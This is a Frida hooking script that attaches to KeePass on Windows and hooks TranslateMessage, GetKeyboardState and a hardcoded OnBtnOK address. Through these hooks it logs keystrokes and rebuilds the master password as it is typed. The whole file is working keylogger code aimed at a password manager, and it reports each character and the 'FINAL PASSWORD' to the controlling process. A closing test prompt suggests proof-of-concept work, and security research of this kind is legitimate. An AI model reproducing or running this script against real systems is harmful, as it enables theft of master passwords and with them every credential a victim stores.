// KeePass Password Capture - Keyboard Focus
// This script focuses on the working keyboard hook approach

function hookKeePass() {
    send("🔐 Starting keyboard-focused KeePass password capture script");
    
        // Global password tracker
    let capturedPassword = "";
    let isCapturing = true;
    let lastKeyPressed = null;
    let lastKeyTime = 0;  // Add timestamp tracking
    let shiftPressed = false;
    
    // Key mapping for common keys (with shift variants)
    const keyMap = {
        // Numbers
        '0x30': { normal: '0', shift: ')' },
        '0x31': { normal: '1', shift: '!' },
        '0x32': { normal: '2', shift: '@' },
        '0x33': { normal: '3', shift: '#' },
        '0x34': { normal: '4', shift: '$' },
        '0x35': { normal: '5', shift: '%' },
        '0x36': { normal: '6', shift: '^' },
        '0x37': { normal: '7', shift: '&' },
        '0x38': { normal: '8', shift: '*' },
        '0x39': { normal: '9', shift: '(' },
        
        // Letters
        '0x41': { normal: 'a', shift: 'A' },
        '0x42': { normal: 'b', shift: 'B' },
        '0x43': { normal: 'c', shift: 'C' },
        '0x44': { normal: 'd', shift: 'D' },
        '0x45': { normal: 'e', shift: 'E' },
        '0x46': { normal: 'f', shift: 'F' },
        '0x47': { normal: 'g', shift: 'G' },
        '0x48': { normal: 'h', shift: 'H' },
        '0x49': { normal: 'i', shift: 'I' },
        '0x4A': { normal: 'j', shift: 'J' },
        '0x4B': { normal: 'k', shift: 'K' },
        '0x4C': { normal: 'l', shift: 'L' },
        '0x4D': { normal: 'm', shift: 'M' },
        '0x4E': { normal: 'n', shift: 'N' },
        '0x4F': { normal: 'o', shift: 'O' },
        '0x50': { normal: 'p', shift: 'P' },
        '0x51': { normal: 'q', shift: 'Q' },
        '0x52': { normal: 'r', shift: 'R' },
        '0x53': { normal: 's', shift: 'S' },
        '0x54': { normal: 't', shift: 'T' },
        '0x55': { normal: 'u', shift: 'U' },
        '0x56': { normal: 'v', shift: 'V' },
        '0x57': { normal: 'w', shift: 'W' },
        '0x58': { normal: 'x', shift: 'X' },
        '0x59': { normal: 'y', shift: 'Y' },
        '0x5A': { normal: 'z', shift: 'Z' },
        
        // Special characters
        '0xBA': { normal: ';', shift: ':' },
        '0xBB': { normal: '=', shift: '+' },
        '0xBC': { normal: ',', shift: '<' },
        '0xBD': { normal: '-', shift: '_' },
        '0xBE': { normal: '.', shift: '>' },
        '0xBF': { normal: '/', shift: '?' },
        '0xC0': { normal: '`', shift: '~' },
        '0xDB': { normal: '[', shift: '{' },
        '0xDC': { normal: '\\', shift: '|' },
        '0xDD': { normal: ']', shift: '}' },
        '0xDE': { normal: '\'', shift: '"' },
        
        // Special keys
        '0x08': { normal: 'BACKSPACE', shift: 'BACKSPACE' },
        '0x0D': { normal: 'ENTER', shift: 'ENTER' }
    };
    
    // Hook Windows API for keyboard input
    try {
        // Hook GetAsyncKeyState to check for shift key status
        const getAsyncKeyState = Module.findExportByName("user32.dll", "GetAsyncKeyState");
        if (getAsyncKeyState) {
            send(`Found GetAsyncKeyState at ${getAsyncKeyState}`);
            
            // Create a function we can call - fix type from 'short' to 'int'
            const GetAsyncKeyState = new NativeFunction(getAsyncKeyState, 'int', ['int']);
            
            // Function to check shift key status
            const checkShiftKey = () => {
                // VK_SHIFT = 0x10
                const shiftState = GetAsyncKeyState(0x10);
                // Fix bitwise operation by using Number() to ensure it's treated as a number
                return (Number(shiftState) & 0x8000) !== 0; // High-order bit set if key is down
            };
            
            // Periodically check the shift key
            setInterval(() => {
                const isShiftDown = checkShiftKey();
                if (isShiftDown !== shiftPressed) {
                    shiftPressed = isShiftDown;
                    send(`Shift key ${shiftPressed ? "pressed" : "released"}`);
                }
            }, 100); // Check every 100ms
        }
        
        // Hook TranslateMessage which processes keyboard messages
        const translateMessage = Module.findExportByName("user32.dll", "TranslateMessage");
        if (translateMessage) {
            send(`Found TranslateMessage at ${translateMessage}`);
            
            Interceptor.attach(translateMessage, {
                onEnter: function(args) {
                    if (isCapturing) {
                        const msgPtr = args[0];
                        if (!msgPtr.isNull()) {
                            const msgType = msgPtr.add(4).readU32();
                            const wParam = msgPtr.add(8).readUInt();
                            
                            // WM_KEYDOWN = 0x0100
                            if (msgType === 0x0100) {
                                const currentTime = Date.now();
                                // Only skip if it's the same key AND within a short time window (250ms)
                                if (lastKeyPressed === wParam && (currentTime - lastKeyTime) < 250) {
                                    return;
                                }
                                
                                lastKeyPressed = wParam;
                                lastKeyTime = currentTime;  // Update timestamp
                                const keyHex = '0x' + wParam.toString(16).toUpperCase();
                                
                                if (keyMap[keyHex]) {
                                    // Check current shift state
                                    const isShift = shiftPressed;
                                    const charToAdd = isShift ? keyMap[keyHex].shift : keyMap[keyHex].normal;
                                    
                                    // Handle special keys
                                    if (charToAdd === 'BACKSPACE') {
                                        if (capturedPassword.length > 0) {
                                            capturedPassword = capturedPassword.substring(0, capturedPassword.length - 1);
                                            send(`⌫ Backspace pressed, password now: "${capturedPassword}"`);
                                        }
                                    } else if (charToAdd === 'ENTER') {
                                        send(`⏎ Enter pressed, final password: "${capturedPassword}"`);
                                    } else {
                                        // Add the character to our password
                                        capturedPassword += charToAdd;
                                        send(`🔑 Key pressed: "${charToAdd}", password now: "${capturedPassword}"`);
                                    }
                                }
                            } else if (msgType === 0x0101) { // WM_KEYUP
                                // Reset lastKeyPressed when key is released
                                if (lastKeyPressed === wParam) {
                                    lastKeyPressed = null;
                                    // No need to reset lastKeyTime as we use the time difference logic
                                }
                            }
                        }
                    }
                }
            });
            
            send("✅ TranslateMessage hook installed successfully");
        }
        
        // Hook GetKeyboardState to track individual key states
        const getKeyboardState = Module.findExportByName("user32.dll", "GetKeyboardState");
        if (getKeyboardState) {
            send(`Found GetKeyboardState at ${getKeyboardState}`);
            
            Interceptor.attach(getKeyboardState, {
                onEnter: function(args) {
                    // args[0] is a pointer to a 256-byte array of key states
                    this.keyStatePtr = args[0];
                },
                
                onLeave: function(retval) {
                    if (isCapturing && this.keyStatePtr && !this.keyStatePtr.isNull()) {
                        // Check for shift key status (VK_SHIFT = 0x10)
                        const shiftKey = this.keyStatePtr.add(0x10).readU8();
                        shiftPressed = (shiftKey & 0x80) !== 0;
                        
                        // In GetKeyboardState, the high bit (0x80) is set if key is down
                        // We'll check all the key codes we're interested in
                        for (const keyHex in keyMap) {
                            const keyCode = parseInt(keyHex, 16);
                            const keyState = this.keyStatePtr.add(keyCode).readU8();
                            
                            // Only process if key is down and it's a new key press
                            if ((keyState & 0x80) !== 0 && lastKeyPressed !== keyCode) {
                                lastKeyPressed = keyCode;
                                
                                // Get the character to add based on shift state
                                const charToAdd = shiftPressed ? keyMap[keyHex].shift : keyMap[keyHex].normal;
                                
                                // Handle special keys
                                if (charToAdd === 'BACKSPACE') {
                                    if (capturedPassword.length > 0) {
                                        capturedPassword = capturedPassword.substring(0, capturedPassword.length - 1);
                                        send(`⌫ Backspace pressed, password now: "${capturedPassword}"`);
                                    }
                                } else if (charToAdd === 'ENTER') {
                                    send(`⏎ Enter pressed, final password: "${capturedPassword}"`);
                                } else {
                                    // Add the character to our password
                                    send(`🔑 Key pressed: "${charToAdd}"`);
                                    capturedPassword += charToAdd;
                                    send(`Current password: "${capturedPassword}"`);
                                }
                            }
                        }
                    }
                }
            });
            
            send("✅ GetKeyboardState hook installed successfully");
        }
    } catch (e) {
        send(`⚠️ Error setting up Windows API hooks: ${e.message}`);
    }
    
    // Hook OnBtnOK to know when password is submitted
    try {
        const onBtnOKAddress = "0x7FFC804EFBE8";
        send(`🔍 Setting up hook for OnBtnOK method at address ${onBtnOKAddress}`);
        
        Interceptor.attach(ptr(onBtnOKAddress), {
            onEnter: function(args) {
                send(`🔘 OnBtnOK called - submitting password`);
                
                // Mark this as the final password
                if (capturedPassword) {
                    send(`🔐 FINAL PASSWORD: "${capturedPassword}"`);
                } else {
                    send("⚠️ No password was captured");
                }
                
                isCapturing = false;
            }
        });
        
        send("✅ OnBtnOK hook installed successfully");
    } catch (e) {
        send(`⚠️ Failed to hook OnBtnOK: ${e.message}`);
    }
    
    // Start capturing by default
    isCapturing = true;
    send("✅ All hooks installed successfully - monitoring for password input");
    send("📝 Please type 'Password123!' in the password field to test capture");
}

// Run the script
function main() {
    send("📌 KeePass password capture starting - keyboard focus");
    hookKeePass();
}

main();